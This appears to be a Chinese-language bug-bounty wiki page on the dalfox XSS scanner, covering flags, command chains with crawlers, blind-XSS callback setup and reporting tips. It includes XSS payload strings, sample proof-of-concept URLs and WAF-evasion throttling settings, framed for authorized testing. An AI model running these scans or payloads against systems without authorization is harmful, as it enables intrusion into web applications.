---
type: wiki
category: tool
tool: dalfox
status: active
last-updated: 2026-04-21
source: https://github.com/hahwul/dalfox
---

# Tool: dalfox（XSS 專用 scanner）

> **用途：** 比 nuclei DAST 更強的 **XSS scanner**。會用 headless browser 真的執行 payload 驗證。
> 內建上百種 payload + WAF bypass 技巧。

## 安裝

```bash
# Go install
go install github.com/hahwul/dalfox/v2@latest

# Homebrew
brew install dalfox

# 確認安裝
dalfox version
```

## 基本用法

```bash
# 單一 URL（含 params）
dalfox url "https://target.com/search?q=test"

# Pipe mode
echo "https://target.com/search?q=test" | dalfox pipe

# File mode
dalfox file urls.txt

# 帶 auth
dalfox url "https://target.com/search?q=test" \
  -H "Cookie: sess=xxx" \
  -H "Authorization: Bearer yyy"
```

## 必學 flag

| Flag | 用途 |
|------|------|
| `url URL` | 單一 URL |
| `pipe` | 從 stdin 讀 |
| `file f.txt` | URL list |
| `-H 'K: v'` | 加 header |
| `-d 'a=b'` | POST data |
| `-X POST` | HTTP method |
| `-F` | Follow redirect |
| `-b https://yourblind.xss.ht` | Blind XSS payload |
| `-p q,s,keyword` | 只 fuzz 這些 param |
| `--custom-payload payload.txt` | 自訂 payload |
| `--only-discovery` | 只找 reflected param，不送 XSS payload |
| `--only-poc r,g,v` | 只輸出特定 POC type |
| `--skip-bav` | 跳過 BAV（基本 attack vector）|
| `--skip-mining-all` | 跳過 param mining |
| `--skip-mining-dict` | 跳過字典 mining |
| `--skip-mining-dom` | 跳過 DOM mining |
| `--mining-dict-word word.txt` | 自訂 mining 字典 |
| `--silence` | 只輸出 finding |
| `-w 50` | Worker（平行度） |
| `--delay 200` | 每 request delay ms |
| `--timeout 10` | timeout |
| `-o file.txt` | 輸出 |
| `--format json` | JSON 輸出 |
| `-S` | 使用系統 proxy |
| `--proxy http://127.0.0.1:8080` | Proxy（Burp）|
| `--cookie 'sess=xxx'` | 加 cookie |
| `--user-agent 'UA'` | 自訂 UA |
| `--remote-payloads 'portswigger'` | 從 PortSwigger 下載最新 payload |
| `--remote-wordlists 'assetnote-small'` | 從 assetnote 下載字典 |

## 推薦組合

### 對 endpoint 快速 XSS 檢測

```bash
dalfox url "https://target.com/search?q=test" \
  --silence \
  --skip-bav
```

### 配合 gf xss 的輸出

```bash
# crawl-chain 產生 gf_xss.txt（含 ?param= 的可疑 URL）
dalfox file crawl_chain_out/target/07_gf_xss.txt \
  --skip-bav \
  --skip-mining-all \
  -w 30 \
  --silence \
  -o dalfox.txt
```

### 帶 blind XSS callback

```bash
# 1. 註冊 https://xsshunter.com 取得 payload URL
# 2. 把它帶進 dalfox
dalfox file urls.txt \
  -b 'https://yourhandle.xss.ht' \
  --silence
```

### 只發現 reflected param（不真的送 XSS）

```bash
# 超低噪音 — 只看哪些 param 反射
dalfox url "https://target.com/search?q=test&cat=all" \
  --only-discovery \
  --silence
```

### 政府案（低速）

```bash
dalfox file urls.txt \
  --delay 2000 \
  -w 3 \
  --timeout 15 \
  --skip-bav \
  --silence \
  -o dalfox_gov.txt
```

### 搭配 Burp（調試用）

```bash
dalfox url "https://target/search?q=test" \
  --proxy http://127.0.0.1:8080 \
  --silence
```

## 輸出範例

```
[V] Triggered XSS Payload (found DOM Object in headless)
[POC][G][GET] https://target.com/search?q="><script>alert(1)</script>
 └ Evidence: type="text" value=""><script>alert(1)</script>"
 └ Classification: Reflected XSS

[V][POC][G][GET] https://target.com/redirect?url=javascript:alert(1)
 └ Evidence: Redirected to javascript: URL
```

`[V]` = Verified（dalfox 真的用 headless browser 看到 alert 觸發）

## XSS Payload 分類

dalfox 內建：

| 類別 | 說明 |
|------|------|
| Common | `<script>`, `<img>`, `<svg>` 等 |
| In-HTML | 字串插入 HTML context |
| In-Attribute | `"` breakout |
| In-JS | JS context（string / template literal） |
| DOM | `innerHTML`, `document.write`, `location.hash` |
| Blind | 需要 XSS Hunter callback |
| Polyglot | 多 context 通用 payload |

### 自訂 payload

```bash
# payload.txt
"><svg/onload=prompt(1)>
'><img src=x onerror=alert(1)>
javascript:alert(1)//

# 使用
dalfox url "https://target/search?q=test" \
  --custom-payload payload.txt \
  --silence
```

## 跟其他工具配合

### katana → dalfox

```bash
katana -u https://target -d 5 -jc -silent | \
  grep "=" | \
  dalfox pipe --silence
```

### gau → dalfox

```bash
gau --subs target.com | \
  uro | \
  grep "?" | \
  dalfox pipe --silence
```

### 完整 chain（katana + gau + gf + dalfox）

```bash
# 就是 crawl-chain 做的事
bbflow hunt target --only crawl-chain
```

## 進階：自架 XSS Hunter

若不想用 xsshunter.com（公開）：

```bash
# 1. 自架 ezxss
docker run -d -p 80:80 \
  -e DOMAIN=oast.yourdomain.com \
  ssl917/ezxss

# 2. dalfox 帶自家 URL
dalfox file urls.txt -b 'https://oast.yourdomain.com/callback'
```

## 注意事項

### 會真的送 XSS payload

- 只對**授權目標**跑
- `--skip-bav` 跳過 BAV 測試（reduces noise）
- 政府案建議 `--delay 2000 -w 3`

### WAF 友善模式

```bash
dalfox url "https://target/search?q=test" \
  --delay 3000 \
  -w 1 \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --silence
```

### headless browser 需要安裝 Chrome

```bash
# macOS
brew install chromium

# Linux
sudo apt install chromium-browser
```

## bbflow 整合

```bash
# hunt-dalfox-xss hunter
bbflow hunt target --only dalfox-xss

# 或 crawl-chain Stage 10
bbflow hunt target --only crawl-chain
```

## 常見問題

### Q：dalfox 找到的 XSS 要怎麼報？
A：
1. 複製 dalfox 輸出的 POC URL
2. 在 Burp Repeater 再送一次確認
3. 用 Chrome 直接開 URL 確認 alert 真的跳
4. 截圖 + 錄影 + curl 指令

### Q：怎麼區分 self-XSS 跟 reflected XSS？
A：
- 把 PoC URL 在**另一個瀏覽器 session / 無痕模式**打開
- 若還能觸發 → Reflected（有價值）
- 若不能 → Self-XSS（無價值，多數 program N/A）

### Q：發現 XSS 但 CSP 擋住？
A：
- 分析 CSP：`curl -sI target | grep -i content-security-policy`
- 找 CSP bypass（不 safe-inline / unsafe-eval / 沒 nonce）
- 報告時明確標註 CSP 限制

## 關聯文件

- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) §XSS
- [13-hunter-crawl-chain.md](13-hunter-crawl-chain.md) §Stage 10
- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) §Payload 編碼
